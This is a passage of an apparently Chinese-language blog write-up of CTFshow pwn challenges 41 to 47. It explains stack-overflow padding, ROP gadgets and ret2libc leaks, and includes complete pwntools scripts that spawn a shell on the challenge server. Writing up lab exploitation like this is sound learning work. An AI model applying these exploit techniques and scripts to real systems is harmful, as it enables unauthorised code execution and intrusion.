+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540547525-e1e55fb4-301d-4188-bce6-709e20a25339.png" srcset="/img/loading.gif" lazyload></p>
+<p>padding&#x3D;0x12+4</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540903607-6e92fb88-d954-46b6-b3c5-40c6c7a39616.png" srcset="/img/loading.gif" lazyload></p>
+<p>至少system函数是还在的</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540959782-2c5b1467-b33d-4676-96d0-417d564859fb.png" srcset="/img/loading.gif" lazyload></p>
+<p>地址为0x80483D0</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541070562-6b18150b-afd6-429f-bad6-f1b253d12258.png" srcset="/img/loading.gif" lazyload></p>
+<p>&#x2F;bin&#x2F;sh没找到，但是这边有个sh</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541104909-1cdcae19-a1c7-4bc8-b809-6b55cd42b32b.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以先试试看，不知道有没有配置sh可执行文件的路径</p>
+<p>还是一样，sh_addr&#x3D;0x080487BA</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541149953-648de55c-b1c0-4e9e-85c4-427671fa2e7d.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后写一个system（”sh”）的代码</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541213146-c76af34c-72d7-4f36-8126-eb13a5d65434.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok运行一下</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541192702-eb30b2c3-0723-4e0a-ab4b-cfeb4d743050.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到运行成功了，说明这题还是给了这个配置环境的</p>
+<p>这边flag：ctfshow{37aaef7a-1ced-43ad-aaff-639a76896ab5}</p>
+<h2 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541265006-5dd87f49-3e9a-425a-9009-ee3483924095.png" srcset="/img/loading.gif" lazyload></p>
+<p>一模一样的</p>
+<p>只是结合一下pwn40和pwn41</p>
+<p>看了看ida，确实是毫无区别</p>
+<p>那就照着填呗</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541409460-99bbb14f-45e2-41d1-b0e1-ed9212c91752.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541341688-dffb42b7-5f2c-4a1a-a4b6-ec309b8af8df.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541443021-3f487e00-674f-483c-a556-39d1140c7f63.png" srcset="/img/loading.gif" lazyload></p>
+<p>padding&#x3D;0xA+8</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541471787-2cf735be-4d77-459a-bf6a-f209fa96d67c.png" srcset="/img/loading.gif" lazyload></p>
+<p>system_addr&#x3D;0x400560</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541500497-b8199f2d-304f-407a-bcc5-77795c873dd6.png" srcset="/img/loading.gif" lazyload></p>
+<p>sh_addr&#x3D;0x400872</p>
+<p>剩下俩地址用命令看</p>
+<p>ROPgadget –binary “pwn42” –only “pop|ret”</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541558008-639cd936-b320-4cab-a3d7-155677c5d184.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到pop_rdi&#x3D;0x400843</p>
+<p>ret &#x3D; 0x40053e</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541652295-732914ea-b804-424a-b0ab-7b6f7df1f886.png" srcset="/img/loading.gif" lazyload></p>
+<p>填充代码即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541642580-12e764b9-4c5a-4305-8393-6c5648a9fa04.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag：ctfshow{eb2397f1-42c3-4b94-ae73-3fc2a1a61a79}</p>
+<h2 id="Pwn43"><a href="#Pwn43" class="headerlink" title="Pwn43"></a>Pwn43</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598155272-3ba73ffd-88f7-4e2a-85db-cf7a9be3542c.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边说似乎是没有&#x2F;bin&#x2F;sh了，但是别的应该都有， 那我们就先解决别的问题</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598187765-e000722a-cb1c-4565-87d6-d7ed62844d63.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边栈溢出的是gets函数，没有输入上限</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598211631-fc2e1caa-59d7-4109-b3d6-0ddf37207d18.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是容器会满</p>
+<p>所以padding&#x3D;0x6C+4</p>
+<p>然后看看system函数</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598240922-9fd65f3c-c6b8-40e9-99ac-803fe6133a6d.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到地址是0x08048450</p>
+<p>到这边其实都准备的差不多了，就看我们如何能够得到&#x2F;bin&#x2F;sh提权了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598284740-69705076-1fbc-4356-b88d-e0ee8e2d1201.png" srcset="/img/loading.gif" lazyload></p>
+<p>hint是这样子说的，似乎想要。。输入？</p>
+<p>或许我们也只能靠输入来得到所谓的&#x2F;bin&#x2F;sh或者sh（也不知道这题给不给用）了</p>
+<p>那想要手动写入，我们就应该先找到可以写入的点在哪里</p>
+<p>先调试，打main断点，然后run启动一下进程，最后看看进程的内存映射情况，大概代码分四步</p>
+<p>gdb pwn43</p>
+<p>break main</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624097064-dbc65550-41e4-4805-80f3-9c458bd7c4d1.png" srcset="/img/loading.gif" lazyload></p>
+<p>run</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624108214-fc224821-35b4-4538-b691-3426ab03658b.png" srcset="/img/loading.gif" lazyload></p>
+<p>vmmap</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624121637-f005245d-c2ed-4048-a5a5-720ce7ea1eef.png" srcset="/img/loading.gif" lazyload></p>
+<p>看Perm那行查看权限，我们知道rwx分别指可读、可写、可执行</p>
+<p>因此在pwn43的那几行里，只有地址为0x804b000的地方可以写，即下图</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624209042-cb9e784e-323e-4baf-859b-3a673158d981.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此一会儿我们就写在这块</p>
+<p>在这块地方我们找到了这个buf2</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624576018-ef88169a-16e8-42be-98c8-2e1c2b8bdd9c.png" srcset="/img/loading.gif" lazyload></p>
+<p>一会儿写的应该就传到这了，地址为0x0804B060</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624632536-8f3bc8e9-1bda-40be-88c4-bff4cc3bf8f1.png" srcset="/img/loading.gif" lazyload></p>
+<p>写是这个gets函数，这个函数地址在0x08048420</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624255002-b725789a-997a-4d2b-8f66-542d731ba804.png" srcset="/img/loading.gif" lazyload></p>
+<p>没错，我们首先要用这个缓冲区指针存储被输入的数据&#x2F;bin&#x2F;sh，然后去把这个再传参传给system即可</p>
+<p>我们要往buf2的地方写这个&#x2F;bin&#x2F;sh然后再传给system</p>
+<p>所以具体的payload就是先构造，构造完发完payload然后再发一个&#x2F;bin&#x2F;sh作为输入</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758625980633-973858a7-d81c-42a7-b7b8-1c473ccf5c5e.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边先构造栈溢出，溢出之后马上返回gets函数的地址</p>
+<p>然后当gets函数执行完之后会返回到system函数</p>
+<p>后边俩buf2的地址，前一个是告诉gets，写到这边</p>
+<p>后一个是告诉system，读这个</p>
+<p>其实都是参数的作用</p>
+<p>后边再sendline一个给gets的东西就行</p>
+<p>运行一下代码</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758625971205-1bfb7a39-2162-420b-82d6-2039375a37f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：ctfshow{2c533373-a400-4e03-936d-c4bdd248afab}</p>
+<h2 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626006953-e2432dc3-d197-4692-abd5-f3e389fb1e78.png" srcset="/img/loading.gif" lazyload></p>
+<p>经典32变64，麻烦不少（）</p>
+<p>我们还是一样的思路</p>
+<blockquote>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626047669-8279af1c-01be-4b90-8f67-b66ca91adb5e.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p>对就是这个</p>
+<p>先看看栈溢出的地方</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626103108-43b25a20-e40d-425b-98f1-c49d673b06a8.png" srcset="/img/loading.gif" lazyload></p>
+<p>OK依旧gets</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626113609-accd7d24-f31d-43a6-b33c-bcdea431c5bf.png" srcset="/img/loading.gif" lazyload></p>
+<p>padding&#x3D;0xA+8</p>
+<p>溢出已构成</p>
+<p>然后咱去看看system地址和gets地址</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626148983-257780bc-62a9-49ea-8d86-b86ae06fd838.png" srcset="/img/loading.gif" lazyload></p>
+<p>system_addr&#x3D;0x0400520</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626243880-81c96b0b-8db9-4791-ae80-e6f46ea69fde.png" srcset="/img/loading.gif" lazyload></p>
+<p>gets_addr&#x3D;0x0400530</p>
+<p>接下来我们看看在哪里可写</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626337839-0d829d34-0fb3-41f4-82ff-ed0a990864a0.png" srcset="/img/loading.gif" lazyload>可写地址在0x603000，2000内存，找一下buf</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626372075-eec30af9-84dd-42b6-8f6f-cb067414031d.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到了，buf2_addr&#x3D;0x602080</p>
+<p>然后该看看pop rdi等搞一下栈对齐了</p>
+<p>ROPgadget –binary “pwn44” –only “pop|ret”</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626477616-7618224f-057b-46b3-b466-da4691343388.png" srcset="/img/loading.gif" lazyload></p>
+<p>pop_rdi_addr&#x3D;0x004007f3 </p>
+<p>ret&#x3D;0x04004fe</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626775522-47343f70-5d58-4512-af69-81a99b2f7b80.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是注意这一题，我们已经设置了rdi的值，调用后不需要返回，因此这边不需要ret值，不需要栈对齐（有点烧脑，不太明白什么时候要，什么时候不要）</p>
+<p>当然，对齐也好</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626975239-fdf4e678-c543-461f-a78d-346f482ffa2d.png" srcset="/img/loading.gif" lazyload></p>
+<p>（上图的ret可写可不写）</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626958179-a545b6e5-dd90-40c6-8552-8ff740d91fd1.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：ctfshow{6cf74756-c984-42ea-afeb-5a3abe7c6d02}</p>
+<h2 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626999093-be8f26bd-6e83-4f2b-b90b-3bafdaa2feed.png" srcset="/img/loading.gif" lazyload></p>
+<p>三无人员来了</p>
+<p>这边不能和刚刚一个思路了，因此刚刚的&#x2F;bin&#x2F;sh作为参数是可以被写进去然后传参的</p>
+<p>但是这边可是内置函数缺失啊，不可用直接写出来，写出来不执行的</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758700515800-6f54dce4-efa4-4e48-a0b5-db73017d9f37.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个和我们之前在纽盾做的libc题目其实是一样的</p>
+<p>elf.sym可以搜到plt表地址</p>
+<p>elf.got可以搜到got表地址</p>
+<p>我们现在知道的是那些偏移地址，我们现在需要的是基地址，因为利用基地址加上偏移地址就是真实地址了</p>
+<p>基地址都是一样的，因此我们可以利用puts函数在got的真实地址，减去其偏移地址，最后得到基地址</p>
+<p>得到基地址之后再加上各偏移地址即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758700832983-b3c6c93d-ace3-41eb-9df9-9bf17056d2a5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758700859241-fbe126d0-5690-4b82-b875-47e4adfa7207.png" srcset="/img/loading.gif" lazyload></p>
+<p>寻址一般是基地址往左移四位然后加上偏移地址（偏移地址一般就四位）</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758705229409-a17559e4-f765-4275-9d8d-c61ba668144b.png" srcset="/img/loading.gif" lazyload></p>
+<p>而找到这些地址我们需要先指定elf地址，然后去直接ELF调用<br>elf &#x3D; ELF(“.&#x2F;pwn45”)</p>
+<p>puts_plt &#x3D; elf.plt[‘puts’]</p>
+<p>puts_got &#x3D; elf.got[‘puts’]</p>
+<p>ctfshow &#x3D; elf.sym[‘ctfshow’]</p>
+<p>于是我们可以得到puts的.plt和.got表地址</p>
+<p>加载ELF（可执行和可链接格式）二进制文件到elf对象中，使我们能够轻松访问符号、地址和段</p>
+<p>在这一步进行完之后我们需要上传第一个payload，以此绕过 ASLR（地址空间布局随机化）保护，先找到泄露的libc地址</p>
+<p>这边用flat是为了让括号里的内容更平滑地变为一个字节序列，无需我们费心于每个数据的具体转换和连接操作（其实不用flat也一样）</p>
+<p>做完这些，我们也就构造好了第一个payload如下，这一步主要是利用栈溢出漏洞，泄露puts函数在内存的真实地址，绕过ASLR，获取libc的基地址（只能是puts，因为只使用过puts）</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758712545545-71df3fef-f73c-4271-ad21-6e5bf2d635e0.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然这边还需要栈溢出漏洞</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758710585078-e73b2260-79ea-42ea-999b-9c298c38eba4.png" srcset="/img/loading.gif" lazyload></p>
+<p>易得padding&#x3D;0x6B+4</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758705900085-7fd282be-b960-4bc8-9ccf-4afb1ca7ea93.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来则是第二个payload构造</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758710051614-0f896521-f9d6-46a6-9610-86d3b811cbce.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二个payload上来肯定是先得到偏移地址，去拿puts的.got表地址，这样减一减就有基地址了</p>
+<p>那这个偏移地址只需要我们定位到这个\xf7，因为注意这边一般64位都是\x7f结尾的，32位都是\xf7，很多的地址高字节都是这样子，所以我们可以直接根据这个定位，取包括这个的前4位</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758712314721-684d4b17-d2fe-4f4c-acb7-b32cc2ffe6e7.png" srcset="/img/loading.gif" lazyload></p>
+<p>就像这种，抓上来puts的真实地址后我们减一下就有基地址了</p>
+<p>&#x3D;puts_real-libc.symbol[‘puts’]</p>
+<p>这边的偏移地址我们需要libc库</p>
+<blockquote>
+<p><del>这边加载libc库文件“.&#x2F;libc-2.27.so”（题目提供或靠自己找）</del></p>
+</blockquote>
+<p>这边这样子做才是对的！我们要靠这个得到libc地址</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758937441167-285dc3ab-50c7-4b0a-b21b-b947bbc5060f.png" srcset="/img/loading.gif" lazyload></p>
+<p>我觉得很扯啊上边的那个做法，如果你是靠直接运行的话意味着每一题都要自己先去找对应的libc库，倒是何神和下边的那个靠libcSearcher的比较普适吧？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">from LibcSearcher import *<br>libc = LibcSearcher(&quot;puts&quot;,puts)<br>libc_base = puts - libc.dump(&quot;puts&quot;)<br></code></pre></td></tr></table></figure>
+
+<p>有了基地址后，我们就可以构造system的真实地址了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758712723203-8e3dffba-7b9c-4b0d-9125-f619d96c97ac.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过计算出的基地址获取system函数和&#x2F;bin&#x2F;sh在远程服务器进程的实际地址</p>
+<p>然后再利用一次栈溢出即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758713681045-f382b714-1af7-4dcd-9823-14774ae9c6e3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758713539578-06df82bb-1bf7-4dce-aa48-dbbd5428c2d9.png" srcset="/img/loading.gif" lazyload></p>
+<p>ctfshow{aedc916c-d726-4c2f-a730-9cccd0e88ed8}</p>
+<h2 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758938540924-6fc9e332-0ce2-466c-a2b9-eaa856517b6c.png" srcset="/img/loading.gif" lazyload></p>
+<p>上边那题的一种64版本</p>
+<p>这边需要注意的一个是在构造第一个payload的时候，只写一个ret程序会崩溃，因此我们这边得乘个2，其实也就是说只塞一个ret的时候rsp没能栈对齐，所以我们需要在塞一个</p>
+<p>可以那么随便的原因是ret本身是安全的，不会有什么有害操作</p>
+<p>所以可以系统性尝试1-3</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758937898003-2e7b3f71-f393-4f1c-8fd1-e4f7d3d50c83.png" srcset="/img/loading.gif" lazyload></p>
+<p>另一个需要注意的我想就是puts &#x3D; u64(p.recvuntil(“\x7f”)[-6:].ljust(8, b”\x00”))</p>
+<p>因为是64位，这边最后是截的\x7f</p>
+<p>而且因为64位需要截取往前6个字节的数据，数据后方需要补零.ljust(8, b”\x00”))补零之后才能被u64进行小端序转换</p>
+<p>在第一个payload利用puts_plt来调用puts函数（由于已使用过puts函数）后，返回到main函数处方便第二次攻击，并且将puts_got的值作为puts参数输出出去</p>
+<p>然后我们通过截断这一个puts_got的值，得到其偏移地址，于是就可以利用这个偏移地址得到其libc库的大致样式，通过LibcSearcher（”puts”,puts）得到</p>
+<p>接下来就可以构造最后的第二个payload了，这边直接先算基地址，用puts的真实地址减去其偏移地址，然后得到基地址后我们再加上在libc库中的system偏移地址和&#x2F;bin&#x2F;sh的偏移地址</p>
+<p>从而成功得到这两个东西，然后我们再传参一次，把&#x2F;bin&#x2F;sh内容传参到这个system函数中去</p>
+<p>即可成功提权</p>
+<p>进入交互模式，然后直接ls再cat flag即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758938459923-4b1c687c-64d3-4c35-a26b-2d951944aeaf.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from LibcSearcher import *<br>p = remote(&quot;pwn.challenge.ctf.show&quot;,28283)<br>elf = ELF(&quot;./pwn46&quot;)<br> <br>main = elf.symbols[&quot;main&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>puts_got = elf.got[&quot;puts&quot;]<br>padding = 0x70+8<br> <br>rdi = 0x0000000000400803<br>ret = 0x00000000004004fe<br> <br>payload = b&quot;a&quot;*padding + p64(rdi) + p64(puts_got) + p64(ret) * 2 + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>puts = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))<br>libc = LibcSearcher(&quot;puts&quot;,puts)<br> <br>libc_base = puts - libc.dump(&quot;puts&quot;)<br>system = libc_base + libc.dump(&quot;system&quot;)<br>binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)<br> <br>payload = b&quot;a&quot;*padding + p64(rdi) + p64(binsh) + p64(ret) + p64(system)<br> <br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758939051844-b644d0d2-0639-489e-ba5b-a84ce43eda2f.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有多种版本</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758939087348-0320b9ea-b676-4e37-a266-cdd82e1122fe.png" srcset="/img/loading.gif" lazyload></p>
+<p>选完直接就出了（这边网络也有讲究，我连我自己的流量热点就能连接上，但是我连水裹的wifi就remote不上）</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758939173592-c40a239a-a671-466f-88d6-d4d9624117e7.png" srcset="/img/loading.gif" lazyload></p>
+<p>有可能是店里的网安发力了</p>
+<p>ctfshow{cf87db9a-b57e-4b05-aa5e-7a1524126675}</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942405070-66a1ecbf-3050-4b9e-adf4-5156ebe664f7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758940990431-c56ae5cf-7bd3-4aa7-8fdc-cb8b60220a72.png" srcset="/img/loading.gif" lazyload></p>
+<p>先看保护</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942431493-2152badc-9bb7-40fe-b63a-9747041ebfe3.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是ez ret2libc吗，我还以为上边那个就是了，其实和pwn45差不多就是了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941037089-ca15fc7c-e6f4-4962-8ec3-f4e6bfff7059.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个是32位的</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941068609-a29586ce-48c0-49e4-8c91-51db55a11a59.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看一下main函数，漏洞点依然在ctfshow里</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941092615-f5dfdc55-3be4-4d7b-a176-27fa01e0a0e1.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边的puts的栈只能塞0x9C+4的内容</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941172700-9777fdff-7b78-435c-a9a2-50a86616138f.png" srcset="/img/loading.gif" lazyload></p>
+<p>padding &#x3D; 0x9C+4</p>
+<p>构造出溢出漏洞后我们其实和pwn45是差不多的思路</p>
+<p>main &#x3D; elf.symbols[“main”]</p>
+<p>puts_plt &#x3D; elf.plt[“puts”]</p>
+<p>puts_got &#x3D; elf.got[“puts”]</p>
+<p>payload1&#x3D;b’a’*padding+p32(puts_plt)+p32(main)+p32(puts_got)</p>
+<p>这边还是像之前一样先利用elf得到puts的.plt和.got表位置，然后构造第一个payload来先将puts的got表地址作为puts参数输出，接下来返回main函数准备接受payload2</p>
+<p>puts &#x3D; u32(io.recvuntil(“\xf7”)[-4:])</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941528829-c2b4c4fa-2a82-4d1d-9e03-2f743c1f21ee.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941542364-84e09f56-80aa-4a4b-9543-56356bb6b58d.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边输出了puts的got表位置后截断一下</p>
+<p>截断之后我们得到了puts函数的真实地址，接下来就能利用这个来得到libc库了</p>
+<p>from LibcSearcher import *</p>
+<p>libc &#x3D; LibcSearcher(“puts”,puts)</p>
+<p>依旧定位libc库</p>
+<p>然后算基地址，算完基地址得到system内容即可</p>
+<p>libc.base &#x3D; puts - libc.dump(“puts”)</p>
+<p>system &#x3D; libc.base+libc.dump(“system”)</p>
+<p>这题给了&#x2F;bin&#x2F;sh，但是我懒得用了，直接用基地址不也一样吗</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942708106-39323cfa-85ef-4401-8a73-52afcfb20917.png" srcset="/img/loading.gif" lazyload></p>
+<p>bin_sh &#x3D; libc.base + libc.dump(“str_bin_sh”)</p>
+<p>得到后构造第二个payload2&#x3D;b’a’*padding+p32(system)+p32(bin_sh)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from LibcSearcher import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28263)<br>elf=ELF(&quot;./pwn47&quot;)<br><br>main = elf.symbols[&quot;main&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>puts_got = elf.got[&quot;puts&quot;]<br>padding = 0x9C+4<br>payload1 = b&quot;a&quot;*padding+p32(puts_plt)+p32(main)+p32(puts_got)<br>io.sendline(payload1)<br><br>puts = u32(io.recvuntil(&quot;\xf7&quot;)[-4:])<br>libc = LibcSearcher(&quot;puts&quot;,puts)<br><br>libc.base = puts-libc.dump(&quot;puts&quot;)<br>system = libc.base+libc.dump(&quot;system&quot;)<br>bin_sh = libc.base + libc.dump(&quot;str_bin_sh&quot;)<br>#这边写/bin/sh地址也一样bin_sh=0x0804B028<br><br>payload2 = b&quot;a&quot;*padding+p32(system)+p32(0)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942641001-6372b5de-3dab-4e38-ac19-7f4f483a9c9c.png" srcset="/img/loading.gif" lazyload></p>
